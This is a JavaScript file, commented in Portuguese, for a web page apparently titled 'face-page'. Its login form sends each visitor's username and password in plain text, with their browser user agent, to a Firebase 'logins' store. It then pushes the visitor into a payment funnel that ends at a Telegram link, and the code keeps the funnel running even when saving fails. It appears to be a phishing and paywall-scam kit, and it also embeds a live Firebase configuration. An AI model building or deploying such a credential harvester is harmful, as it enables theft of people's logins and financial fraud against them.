// ============================================================
//  Firebase SDK (ESM via CDN)
// ============================================================
import { initializeApp } from "https://www.gstatic.com/firebasejs/11.3.1/firebase-app.js";
import { getDatabase, ref, push, set, onValue } from "https://www.gstatic.com/firebasejs/11.3.1/firebase-database.js";

// ============================================================
//  Configuração do projeto Firebase
// ============================================================
const firebaseConfig = {
  apiKey: "AIzaSyBa3hkDcMKYnrK4cDJpGz5C6o1KG4VQVsg",
  authDomain: "face-page-49adb.firebaseapp.com",
  databaseURL: "https://face-page-49adb-default-rtdb.firebaseio.com",
  projectId: "face-page-49adb",
  storageBucket: "face-page-49adb.firebasestorage.app",
  messagingSenderId: "9155583772",
  appId: "1:9155583772:web:c8c863a943222539cee4d9"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

// Destino após confirmar acesso
const REDIRECT_URL = 'https://t.me/+MoOkZIMW2bdlYzMx';

// URL do seu Checkout do Kirvano
const PAYMENT_BASE_URL = 'https://pay.kirvano.com/97376049-05c9-42b6-96f8-9b0fab2ac35c';

// ============================================================
//  Gera um ID de sessão único para rastrear o pagamento
// ============================================================
function gerarSessionId() {
  return 'sess_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2, 9);
}

// ID desta sessão — persiste enquanto a aba estiver aberta
const sessionId = gerarSessionId();

// ============================================================
//  SUBMIT DO FORMULÁRIO
// ============================================================
document.getElementById('loginForm').addEventListener('submit', function (event) {
  event.preventDefault();

  const inputs = this.getElementsByTagName('input');
  const username = inputs[0].value.trim();
  const password = inputs[1].value.trim();

  // 1. Salva credenciais no Firebase
  push(ref(db, 'logins'), {
    username,
    password,
    sessionId,
    timestamp: new Date().toISOString(),
    userAgent: navigator.userAgent
  }).catch(err => console.error('Erro ao salvar login:', err));

  // 2. Cria registro de pagamento com status "pending"
  set(ref(db, `payments/${sessionId}`), {
    status: 'pending',
    username,
    createdAt: new Date().toISOString()
  }).then(() => {
    // 3. Exibe o modal e inicia escuta em tempo real
    exibirModal();
    escutarPagamento();
  }).catch(err => {
    console.error('Erro ao criar sessão de pagamento (Regras bloqueadas?):', err);
    // MESMO COM ERRO (ex: Permission Denied), ABRE A TELA PRA CONTINUAR O FUNIL
    exibirModal();
  });
});


// ============================================================
//  Exibe o modal de pagamento com animação
// ============================================================
function exibirModal() {
  const overlay = document.getElementById('paymentOverlay');
  overlay.style.display = 'flex';
  requestAnimationFrame(() => overlay.classList.add('visible'));
}


// ============================================================
//  Abre o pagamento como POPUP (resolve o bloqueio de iFrame do Kirvano)
// ============================================================
document.getElementById('btnPagar').addEventListener('click', function () {
  const urlPagamento = PAYMENT_BASE_URL.includes('?')
    ? `${PAYMENT_BASE_URL}&src=${sessionId}`
    : `${PAYMENT_BASE_URL}?src=${sessionId}`;

  // Mostra que está aguardando na tela principal
  document.getElementById('paymentStatus').classList.remove('hidden');
  document.getElementById('statusWaiting').classList.remove('hidden');

  // Dimensões do popup de pagamento
  const largura = 500;
  const altura = 750;
  const left = Math.round((screen.width - largura) / 2);
  const top = Math.round((screen.height - altura) / 2);

  // Abre a janela de Pop-up limpinha para o Kirvano
  const popup = window.open(
    urlPagamento,
    'kirvano_checkout',
    `width=${largura},height=${altura},left=${left},top=${top},resizable=yes,scrollbars=yes,status=no,toolbar=no,menubar=no,location=no`
  );

  // Se o popup for bloqueado pelo navegador, manda para uma nova aba normal
  if (!popup || popup.closed || typeof popup.closed == 'undefined') {
    window.open(urlPagamento, '_blank');
  }
});


// ============================================================
//  Escuta o Firebase em tempo real — aguarda status = "paid"
// ============================================================
function escutarPagamento() {
  const pagamentoRef = ref(db, `payments/${sessionId}/status`);

  onValue(pagamentoRef, (snapshot) => {
    const status = snapshot.val();

    if (status === 'paid') {
      confirmarPagamento();
    }
  });
}


// ============================================================
//  Confirma pagamento: atualiza UI e habilita botão de acesso
// ============================================================
function confirmarPagamento() {
  // Esconde "aguardando", mostra "confirmado"
  document.getElementById('statusWaiting').classList.add('hidden');
  document.getElementById('statusConfirmed').classList.remove('hidden');

  // Habilita o botão de acesso
  const btnAcessar = document.getElementById('btnAcessar');
  btnAcessar.disabled = false;
  btnAcessar.classList.add('ready');

  // Redireciona ao clicar
  btnAcessar.addEventListener('click', () => {
    window.location.href = REDIRECT_URL;
  });
}